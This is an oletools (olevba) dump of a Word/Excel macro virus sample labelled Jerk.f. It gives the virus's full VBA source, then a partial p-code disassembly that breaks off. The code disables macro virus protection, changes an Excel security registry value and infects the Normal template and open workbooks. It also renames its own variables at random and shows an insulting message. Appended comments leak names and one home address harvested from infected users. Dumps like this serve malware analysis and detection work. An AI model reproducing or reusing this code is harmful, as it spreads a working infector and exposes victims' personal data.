olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Jerk.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Jerk.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


































Private Sub Document_Close()
On Error Resume Next
Const OYPSFPEV = True, KEXIOVYRKXZ = False, ENLXFQYEBDGXIH = 0, QKCJXXBGERE = 1, IGZYLZRK = wdFormatDocument, VIHXTSYBKWQPXY = wdFormatTemplate, ZLBNNY = ":"
Dim JYSKBPQABEKMO, QUBCNCNQKE, ZRREAUCBL, PWAYNJWMSPF As Boolean
Dim HQBQUMQNHLOSB, OCFJIOUA As Object
Dim PCDZEOQCFNUS, TENMTXFWLOHWB As String
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
Set HQBQUMQNHLOSB = ActiveDocument.VBProject.VBComponents.Item(QKCJXXBGERE)
Set OCFJIOUA = NormalTemplate.VBProject.VBComponents.Item(QKCJXXBGERE)
Randomize
ZRREAUCBL = KEXIOVYRKXZ
PWAYNJWMSPF = KEXIOVYRKXZ
If HQBQUMQNHLOSB.CodeModule.CountOfLines <> ENLXFQYEBDGXIH Then ZRREAUCBL = OYPSFPEV
If OCFJIOUA.CodeModule.CountOfLines <> ENLXFQYEBDGXIH Then PWAYNJWMSPF = OYPSFPEV
Options.VirusProtection = KEXIOVYRKXZ
If (ZRREAUCBL = OYPSFPEV Xor PWAYNJWMSPF = OYPSFPEV) And (ActiveDocument.SaveFormat = IGZYLZRK Or ActiveDocument.SaveFormat = VIHXTSYBKWQPXY) Then
If ZRREAUCBL = OYPSFPEV Then
QUBCNCNQKE = NormalTemplate.Saved
TENMTXFWLOHWB = HQBQUMQNHLOSB.CodeModule.Lines(QKCJXXBGERE, HQBQUMQNHLOSB.CodeModule.CountOfLines)
Call RXHBLNCXIYAU(TENMTXFWLOHWB)
If Int(Rnd * 10 * QKCJXXBGERE) = QKCJXXBGERE * 7 Then Call WUGBESF(TENMTXFWLOHWB)
Call LGVRXAM(TENMTXFWLOHWB)
OCFJIOUA.CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If QUBCNCNQKE = OYPSFPEV Then NormalTemplate.Save
End If
PCDZEOQCFNUS = Mid(ActiveDocument.FullName, 2, QKCJXXBGERE)
If PWAYNJWMSPF = OYPSFPEV And (PCDZEOQCFNUS = ZLBNNY Or ActiveDocument.Saved = KEXIOVYRKXZ) Then
JYSKBPQABEKMO = ActiveDocument.Saved
TENMTXFWLOHWB = OCFJIOUA.CodeModule.Lines(QKCJXXBGERE, OCFJIOUA.CodeModule.CountOfLines)
Call LGVRXAM(TENMTXFWLOHWB)
HQBQUMQNHLOSB.CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If JYSKBPQABEKMO = OYPSFPEV Then ActiveDocument.Save
End If
End If
End Sub
Private Sub WUGBESF(ByRef TENMTXFWLOHWB As String)
On Error Resume Next
Const RAZQOBAA = 48, QKZMFYY = 15, YUGZOV = 5, LUOQAHTCTVBUJL = 65, HFCTOT = 90, QKCJXXBGERE = 1, OYPSFPEV = True, KEXIOVYRKXZ = False
Dim XZDOWAKSWXD, XQYGRTmp, VYQIGSLXOZL, XQYGR(QKCJXXBGERE To RAZQOBAA), XQYGR2(QKCJXXBGERE To RAZQOBAA) As String
Dim YWSFYTAZWGTHVBN, PNXJERHBBO, MKSGE As Integer
Dim YZZAJODXNSZYEX As Boolean
XZDOWAKSWXD = "TENMTXFWLOHWB RAZQOBAA XQYGR XQYGR2 VYQIGSLXOZL YWSFYTAZWGTHVBN PNXJERHBBO MKSGE YZZAJODXNSZYEX WUGBESF QKZMFYY YUGZOV LUOQAHTCTVBUJL HFCTOT QKCJXXBGERE XZDOWAKSWXD XQYGRTmp JYSKBPQABEKMO QUBCNCNQKE ZRREAUCBL PWAYNJWMSPF HQBQUMQNHLOSB OCFJIOUA RXHBLNCXIYAU YGOFCUNZCWFJ RJHYJXBSELYZX JHQCGQSROAVOCT GSGLJLEWZFMM YGOFCUNZCWFJTmp OTCSY FBCQLLDG PCDZEOQCFNUS OYPSFPEV KEXIOVYRKXZ ENLXFQYEBDGXIH IGZYLZRK VIHXTSYBKWQPXY NNGNOZHGSKP VIGZM ZLBNNY KZTYYQLI ZZVDDYDSZWZOKZ DWGMWZKPXXPGKDZ SMPYXIUJV LGVRXAM QKWOSNNSETNBOLS FFMKEFJJRVHP NVHMC"
Randomize
PNXJERHBBO = QKCJXXBGERE
For YWSFYTAZWGTHVBN = QKCJXXBGERE To Len(XZDOWAKSWXD)
If Mid(XZDOWAKSWXD, YWSFYTAZWGTHVBN, QKCJXXBGERE) = " " Or YWSFYTAZWGTHVBN = Len(XZDOWAKSWXD) Then
If YWSFYTAZWGTHVBN = Len(XZDOWAKSWXD) Then XQYGRTmp = XQYGRTmp & Mid(XZDOWAKSWXD, YWSFYTAZWGTHVBN, QKCJXXBGERE)
For MKSGE = QKCJXXBGERE To Int((QKZMFYY - YUGZOV + QKCJXXBGERE) * Rnd + YUGZOV)
XQYGR2(PNXJERHBBO) = XQYGR2(PNXJERHBBO) & Chr(Int((HFCTOT - LUOQAHTCTVBUJL + QKCJXXBGERE) * Rnd + LUOQAHTCTVBUJL))
Next MKSGE
XQYGR(PNXJERHBBO) = XQYGRTmp
XQYGRTmp = ""
PNXJERHBBO = PNXJERHBBO + QKCJXXBGERE
Else
XQYGRTmp = XQYGRTmp & Mid(XZDOWAKSWXD, YWSFYTAZWGTHVBN, QKCJXXBGERE)
End If
Next YWSFYTAZWGTHVBN
YZZAJODXNSZYEX = KEXIOVYRKXZ
For YWSFYTAZWGTHVBN = QKCJXXBGERE To Len(TENMTXFWLOHWB)
For PNXJERHBBO = QKCJXXBGERE To RAZQOBAA
If Mid(TENMTXFWLOHWB, YWSFYTAZWGTHVBN, Len(XQYGR(PNXJERHBBO))) = XQYGR(PNXJERHBBO) Then
VYQIGSLXOZL = VYQIGSLXOZL & XQYGR2(PNXJERHBBO)
YWSFYTAZWGTHVBN = YWSFYTAZWGTHVBN + Len(XQYGR(PNXJERHBBO)) - QKCJXXBGERE
YZZAJODXNSZYEX = OYPSFPEV
Exit For
End If
Next PNXJERHBBO
If YZZAJODXNSZYEX = KEXIOVYRKXZ Then
VYQIGSLXOZL = VYQIGSLXOZL & Mid(TENMTXFWLOHWB, YWSFYTAZWGTHVBN, QKCJXXBGERE)
Else
YZZAJODXNSZYEX = KEXIOVYRKXZ
End If
Next YWSFYTAZWGTHVBN
TENMTXFWLOHWB = VYQIGSLXOZL
End Sub
Private Sub RXHBLNCXIYAU(ByRef TENMTXFWLOHWB As String)
On Error Resume Next
Const GSGLJLEWZFMM = "' ", QKCJXXBGERE = 1
Const NNGNOZHGSKP = "hh:mm:ss: AMPM - ", VIGZM = "dddd, d mmm yyyy"
Dim YGOFCUNZCWFJTmp, YGOFCUNZCWFJ, OTCSY, FBCQLLDG, RJHYJXBSELYZX, JHQCGQSROAVOCT As String
Dim YWSFYTAZWGTHVBN As Integer
RJHYJXBSELYZX = Chr(10 * QKCJXXBGERE + 3)
YGOFCUNZCWFJ = Application.UserAddress
FBCQLLDG = Format(Time, NNGNOZHGSKP) & Format(Date, VIGZM)
JHQCGQSROAVOCT = Chr(QKCJXXBGERE * 10)
OTCSY = Application.UserName
For YWSFYTAZWGTHVBN = QKCJXXBGERE To Len(YGOFCUNZCWFJ)
If Mid(YGOFCUNZCWFJ, YWSFYTAZWGTHVBN, QKCJXXBGERE) <> RJHYJXBSELYZX Then
If Mid(YGOFCUNZCWFJ, YWSFYTAZWGTHVBN, QKCJXXBGERE) <> JHQCGQSROAVOCT Then
YGOFCUNZCWFJTmp = YGOFCUNZCWFJTmp & Mid(YGOFCUNZCWFJ, YWSFYTAZWGTHVBN, QKCJXXBGERE)
End If
Else
YGOFCUNZCWFJTmp = YGOFCUNZCWFJTmp & RJHYJXBSELYZX & GSGLJLEWZFMM
End If
Next YWSFYTAZWGTHVBN
TENMTXFWLOHWB = TENMTXFWLOHWB & RJHYJXBSELYZX & GSGLJLEWZFMM & FBCQLLDG & RJHYJXBSELYZX & GSGLJLEWZFMM & OTCSY & RJHYJXBSELYZX & GSGLJLEWZFMM & YGOFCUNZCWFJ & RJHYJXBSELYZX
End Sub
Private Sub LGVRXAM(ByVal TENMTXFWLOHWB As String)
On Error Resume Next
Dim NVHMC As Long
Dim KZTYYQLI As Object
Dim QKWOSNNSETNBOLS, FFMKEFJJRVHP As String
QKWOSNNSETNBOLS = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
NVHMC = &H0
FFMKEFJJRVHP = "Options6"
System.PrivateProfileString("", QKWOSNNSETNBOLS, FFMKEFJJRVHP) = NVHMC
Set KZTYYQLI = GetObject(, "Excel.Application")
Const QKCJXXBGERE = 1, ENLXFQYEBDGXIH = 0
Dim DWGMWZKPXXPGKDZ As String
Dim YWSFYTAZWGTHVBN, PNXJERHBBO As Integer
DWGMWZKPXXPGKDZ = "ThisWorkbook"
For YWSFYTAZWGTHVBN = QKCJXXBGERE To KZTYYQLI.Application.Workbooks.Count
For PNXJERHBBO = QKCJXXBGERE To KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Count
If KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.CountOfLines = ENLXFQYEBDGXIH Then
KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).Name = DWGMWZKPXXPGKDZ Then
KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.ReplaceLine 33 * QKCJXXBGERE, "Private Sub Workbook_Deactivate()"
Else
KZTYYQLI.Application.Workbooks.Item(YWSFYTAZWGTHVBN).VBProject.VBComponents.Item(PNXJERHBBO).CodeModule.ReplaceLine QKCJXXBGERE * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next PNXJERHBBO
Next YWSFYTAZWGTHVBN
Set KZTYYQLI = Nothing
End Sub
Private Sub SMPYXIUJV(ByVal TENMTXFWLOHWB As String)
On Error Resume Next
Const OYPSFPEV = True, KEXIOVYRKXZ = False, QKCJXXBGERE = 1, ENLXFQYEBDGXIH = 0
Dim ZZVDDYDSZWZOKZ As Object
Dim QUBCNCNQKE As Boolean
Set ZZVDDYDSZWZOKZ = GetObject(, "Word.Application")
If ZZVDDYDSZWZOKZ.NormalTemplate.VBProject.VBComponents.Item(QKCJXXBGERE).CodeModule.CountOfLines = ENLXFQYEBDGXIH Then
QUBCNCNQKE = ZZVDDYDSZWZOKZ.NormalTemplate.Saved
ZZVDDYDSZWZOKZ.Options.VirusProtection = KEXIOVYRKXZ
ZZVDDYDSZWZOKZ.NormalTemplate.VBProject.VBComponents.Item(QKCJXXBGERE).CodeModule.InsertLines QKCJXXBGERE, TENMTXFWLOHWB
If QUBCNCNQKE = OYPSFPEV Then ZZVDDYDSZWZOKZ.NormalTemplate.Save
End If
Set ZZVDDYDSZWZOKZ = Nothing
End Sub

' 09:50:09: AM - Wednesday, 10 Feb 1999
' Al Peabody
' 1634 Orchard Beach Road
Annapolis, MD 21401

' 09:42:15: AM - Monday, 22 Feb 1999
' Sergey Morozov
'

' 09:49:26: AM - ÷åòâåðã, 11 ìàð 1999
' Advisor
'

' 04:16:54:  - ïîíåäåëüíèê, 22 ìàð 1999
' ***
'

' 11:52:11:  - ÷åòâåðã, 15 àïð 1999
' Freddy Kruger
'

' 11:45:13:  - âòîðíèê, 27 ìàé 1997
' MAXuS
'

' 09:59:34:  - ñóááîòà, 3 èþí 1995
' 7
'

' 08:02:29:  - ñóááîòà, 7 ôåâ 1998
' Alex
'

' 11:07:41:  - âîñêðåñåíüå, 8 ôåâ 1998
' Alex
'

' 01:34:29:  - ïîíåäåëüíèê, 9 ôåâ 1998
' Alex
'

' 07:03:00:  - ñðåäà, 4 ôåâ 1998
' Alex
'

' 02:46:36:  - ñóááîòà, 4 ìàð 2000
' user
'

' 11:17:37:  - ïÿòíèöà, 4 ÿíâ 1980
' Ñâåòà
'

' 03:14:19:  - ñðåäà, 21 èþí 2000
' User
'

' 12:41:56:  - âîñêðåñåíüå, 9 èþë 2000
' Ëåíà
'

' 10:39:32:  - ñóááîòà, 2 ñåí 2000
' Ëåíà
'

' 11.57.54.  - martedì, 10 ott 2000
' Èíà
'

' 02:57:29:  - ÷åòâåðã, 19 îêò 2000
' Ina
'

' 04:14:51:  - piektdiena, 12 Jan 2001
' Sandra Kraze
'

' 08:13:34: PM - Thursday, 25 Jan 2001
' Tester
'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Jerk.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15520 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' 	FuncDefn (Private Sub Document_Close())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn OYPSFPEV
' 	LitVarSpecial (False)
' 	VarDefn KEXIOVYRKXZ
' 	LitDI2 0x0000 
' 	VarDefn ENLXFQYEBDGXIH
' 	LitDI2 0x0001 
' 	VarDefn QKCJXXBGERE
' 	Ld wdFormatDocument 
' 	VarDefn IGZYLZRK
' 	Ld wdFormatTemplate 
' 	VarDefn VIHXTSYBKWQPXY
' 	LitStr 0x0001 ":"
' 	VarDefn ZLBNNY
' Line #37:
' 	Dim 
' 	VarDefn JYSKBPQABEKMO
' 	VarDefn QUBCNCNQKE
' 	VarDefn ZRREAUCBL
' 	VarDefn PWAYNJWMSPF (As Boolean)
' Line #38:
' 	Dim 
' 	VarDefn HQBQUMQNHLOSB
' 	VarDefn OCFJIOUA (As Object)
' Line #39:
' 	Dim 
' 	VarDefn PCDZEOQCFNUS
' 	VarDefn TENMTXFWLOHWB (As String)
' Line #40:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #41:
' 	SetStmt 
' 	Ld QKCJXXBGERE 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set HQBQUMQNHLOSB 
' Line #42:
' 	SetStmt 
' 	Ld QKCJXXBGERE 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set OCFJIOUA 
' Line #43:
' 	ArgsCall Read 0x0000 
' Line #44:
' 	Ld KEXIOVYRKXZ 
' 	St ZRREAUCBL 
' Line #45:
' 	Ld KEXIOVYRKXZ 
' 	St PWAYNJWMSPF 
' Line #46:
' 	Ld HQBQUMQNHLOSB 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ENLXFQYEBDGXIH 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld OYPSFPEV 
' 	St ZRREAUCBL 
' 	EndIf 
' Line #47:
' 	Ld OCFJIOUA 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ENLXFQYEBDGXIH 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld OYPSFPEV 
' 	St PWAYNJWMSPF 
' 	EndIf 
' Line #48:
' 	Ld KEXIOVYRKXZ 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #49:
' 	Ld ZRREAUCBL 
' 	Ld OYPSFPEV 
' 	Eq 
' 	Ld PWAYNJWMSPF 
' 	Ld OYPSFPEV 
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld IGZYLZRK 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld VIHXTSYBKWQPXY 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #50:
' 	Ld ZRREAUCBL 
' 	Ld OYPSFPEV 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St QUBCNCNQKE 
' Line #52:
' 	Ld QKCJXXBGERE 
' 	Ld HQBQUMQNHLOSB 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld HQBQUMQNHLOSB 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St TENMTXFWLOHWB 
' Line #53:
' 	Ld TENMTXFWLOHWB 
' 	ArgsCall (Call) RXHBLNCXIYAU 0x0001 
' Line #54:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	Ld QKCJXXBGERE 
' 	Mul 
' 	FnInt 
' 	Ld QKCJXXBGERE 
' 	LitDI2 0x0007 
' 	Mul 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TENMTXFWLOHWB 
' 	ArgsCall (Call) WUGBESF 0x0001 
' 	EndIf 
' Line #55:
' 	Ld TENMTXFWLOHWB 
' 	ArgsCall (Call) LGVRXAM 0x0001 
' Line #56:
' 	Ld QKCJXXBGERE 
' 	Ld TENMTXFWLOHWB 
' 	Ld OCFJIOUA 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #57:
' 	Ld QUBCNCNQKE 
' 	Ld OYPSFPEV 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	St PCDZEOQCFNUS 
' Line #60:
' 	Ld PWAYNJWMSPF 
' 	Ld OYPSFPEV 
' 	Eq 
' 	Ld PCDZEOQCFNUS 
' 	Ld ZLBNNY 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld KEXIOVYRKXZ 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St JYSKBPQABEKMO 
' Line #62:
' 	Ld QKCJXXBGERE 
' 	Ld OCFJIOUA 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld OCFJIOUA 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St TENMTXFWLOHWB 
' Line #63:
' 	Ld TENMTXFWLOHWB 
' 	ArgsCall (Call) LGVRXAM 0x0001 
' Line #64:
' 	Ld QKCJXXBGERE 
' 	Ld TENMTXFWLOHWB 
' 	Ld HQBQUMQNHLOSB 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #65:
' 	Ld JYSKBPQABEKMO 
' 	Ld OYPSFPEV 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Sub WUGBESF(ByRef TENMTXFWLOHWB As String))
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	Dim (Const) 
' 	LitDI2 0x0030 
' 	VarDefn RAZQOBAA
' 	LitDI2 0x000F 
' 	VarDefn QKZMFYY
' 	LitDI2 0x0005 
' 	VarDefn YUGZOV
' 	LitDI2 0x0041 
' 	VarDefn LUOQAHTCTVBUJL
' 	LitDI2 0x005A 
' 	VarDefn HFCTOT
' 	LitDI2 0x0001 
' 	VarDefn QKCJXXBGERE
' 	LitVarSpecial (True)
' 	VarDefn OYPSFPEV
' 	LitVarSpecial (False)
' 	VarDefn KEXIOVYRKXZ
' Line #72:
' 	Dim 
' 	VarDefn XZDOWAKSWXD
' 	VarDefn XQYGRTmp
' 	VarDefn VYQIGSLXOZL
' 	Ld QKCJXXBGERE 
' 	Ld RAZQOBAA 
' 	VarDefn XQYGR
' 	Ld QKCJXXBGERE 
' 	Ld RAZQOBAA 
' 	VarDefn XQYGR2 (As String)
' Line #73:
' 	Dim 
' 	VarDefn YWSFYTAZWGTHVBN
' 	VarDefn PNXJERHBBO
' 	VarDefn MKSGE (As Integer)
' Line #74:
' 	Dim 
' 	VarDefn YZZAJODXNSZYEX (As Boolean)
' Line #75:
' 	LitStr 0x0215 "TENMTXFWLOHWB RAZQOBAA XQYGR XQYGR2 VYQIGSLXOZL YWSFYTAZWGTHVBN PNXJERHBBO MKSGE YZZAJODXNSZYEX WUGBESF QKZMFYY YUGZOV LUOQAHTCTVBUJL HFCTOT QKCJXXBGERE XZDOWAKSWXD XQYGRTmp JYSKBPQABEKMO QUBCNCNQKE ZRREAUCBL PWAYNJWMSPF HQBQUMQNHLOSB OCFJIOUA RXHBLNCXIYAU YGOFCUNZCWFJ RJHYJXBSELYZX JHQCGQSROAVOCT GSGLJLEWZFMM YGOFCUNZCWFJTmp OTCSY FBCQLLDG PCDZEOQCFNUS OYPSFPEV KEXIOVYRKXZ ENLXFQYEBDGXIH IGZYLZRK VIHXTSYBKWQPXY NNGNOZHGSKP VIGZM ZLBNNY KZTYYQLI ZZVDDYDSZWZOKZ DWGMWZKPXXPGKDZ SMPYXIUJV LGVRXAM QKWOSNNSETNBOLS FFMKEFJJRVHP NVHMC"
' 	St XZDOWAKSWXD 
' Line #76:
' 	ArgsCall Read 0x0000 
' Line #77:
' 	Ld QKCJXXBGERE 
' 	St PNXJERHBBO 
' Line #78:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	Ld QKCJXXBGERE 
' 	Ld XZDOWAKSWXD 
' 	FnLen 
' 	For 
' Line #79:
' 	Ld XZDOWAKSWXD 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld XZDOWAKSWXD 
' 	FnLen 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #80:
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld XZDOWAKSWXD 
' 	FnLen 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld XQYGRTmp 
' 	Ld XZDOWAKSWXD 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St XQYGRTmp 
' 	EndIf 
' Line #81:
' 	StartForVariable 
' 	Ld MKSGE 
' 	EndForVariable 
' 	Ld QKCJXXBGERE 
' 	Ld QKZMFYY 
' 	Ld YUGZOV 
' 	Sub 
' 	Ld QKCJXXBGERE 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld YUGZOV 
' 	Add 
' 	FnInt 
' 	For 
' Line #82:
' 	Ld PNXJERHBBO 
' 	ArgsLd XQYGR2 0x0001 
' 	Ld HFCTOT 
' 	Ld LUOQAHTCTVBUJL 
' 	Sub 
' 	Ld QKCJXXBGERE 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld LUOQAHTCTVBUJL 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld PNXJERHBBO 
' 	ArgsSt XQYGR2 0x0001 
' Line #83:
' 	StartForVariable 
' 	Ld MKSGE 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	Ld XQYGRTmp 
' 	Ld PNXJERHBBO 
' 	ArgsSt XQYGR 0x0001 
' Line #85:
' 	LitStr 0x0000 ""
' 	St XQYGRTmp 
' Line #86:
' 	Ld PNXJERHBBO 
' 	Ld QKCJXXBGERE 
' 	Add 
' 	St PNXJERHBBO 
' Line #87:
' 	ElseBlock 
' Line #88:
' 	Ld XQYGRTmp 
' 	Ld XZDOWAKSWXD 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St XQYGRTmp 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	Ld KEXIOVYRKXZ 
' 	St YZZAJODXNSZYEX 
' Line #92:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	Ld QKCJXXBGERE 
' 	Ld TENMTXFWLOHWB 
' 	FnLen 
' 	For 
' Line #93:
' 	StartForVariable 
' 	Ld PNXJERHBBO 
' 	EndForVariable 
' 	Ld QKCJXXBGERE 
' 	Ld RAZQOBAA 
' 	For 
' Line #94:
' 	Ld TENMTXFWLOHWB 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld PNXJERHBBO 
' 	ArgsLd XQYGR 0x0001 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld PNXJERHBBO 
' 	ArgsLd XQYGR 0x0001 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	Ld VYQIGSLXOZL 
' 	Ld PNXJERHBBO 
' 	ArgsLd XQYGR2 0x0001 
' 	Concat 
' 	St VYQIGSLXOZL 
' Line #96:
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld PNXJERHBBO 
' 	ArgsLd XQYGR 0x0001 
' 	FnLen 
' 	Add 
' 	Ld QKCJXXBGERE 
' 	Sub 
' 	St YWSFYTAZWGTHVBN 
' Line #97:
' 	Ld OYPSFPEV 
' 	St YZZAJODXNSZYEX 
' Line #98:
' 	ExitFor 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld PNXJERHBBO 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	Ld YZZAJODXNSZYEX 
' 	Ld KEXIOVYRKXZ 
' 	Eq 
' 	IfBlock 
' Line #102:
' 	Ld VYQIGSLXOZL 
' 	Ld TENMTXFWLOHWB 
' 	Ld YWSFYTAZWGTHVBN 
' 	Ld QKCJXXBGERE 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St VYQIGSLXOZL 
' Line #103:
' 	ElseBlock 
' Line #104:
' 	Ld KEXIOVYRKXZ 
' 	St YZZAJODXNSZYEX 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld YWSFYTAZWGTHVBN 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld VYQIGSLXOZL 
' 	St TENMTXFWLOHWB 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Private Sub RXHBLNCXIYAU(ByRef TENMTXFWLOHWB As String))
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	Dim (Const) 
' 	LitStr 0x0002 "' "
' 	VarDefn GSGLJLEWZFMM
' 	LitDI2 0x0001 
' 	VarDefn QKCJXXBGERE
' Line #112:
' 	Dim (Const) 
' 	LitStr 0x0011 "hh:mm:ss: AMPM - "
' 	VarDefn NNGNOZHGSKP
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	VarDefn VIGZM
' Line #113:
' 	Dim 
' 	VarDefn YGOFCUNZCWFJTmp
' 	VarDefn YGOFCUNZCWFJ
' 	VarDefn OTCSY
' 	VarDefn FBCQLLDG
' 	VarDefn RJHYJXBSELYZX
' 	VarDefn JHQCGQSROAVOCT (As String)
' Line #114:
' 	Dim 
' 	VarDefn YWSFYTAZWGTHVBN (As Integer)
' Line #115:
' 	LitDI2 0x000A 
' 	Ld QKCJXXBGERE 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St RJHYJXBSELYZX 
' Line #116:
' 	Ld Application 
' 	MemLd UserAddress 
' 	St YGOFCUNZCWFJ 
' Line #117:
' 	Ld Time 
' 	Ld NNGNOZHGSKP 
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	Ld VIGZM 
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St FBCQLLDG 
' Line #118:
' 	Ld QKCJXXBGERE 
' 	LitDI2 0x000A 
' 	Mul 
' 	ArgsLd Chr 0x0001 
' 	St JHQCGQSROAVOCT 
' Line #119:
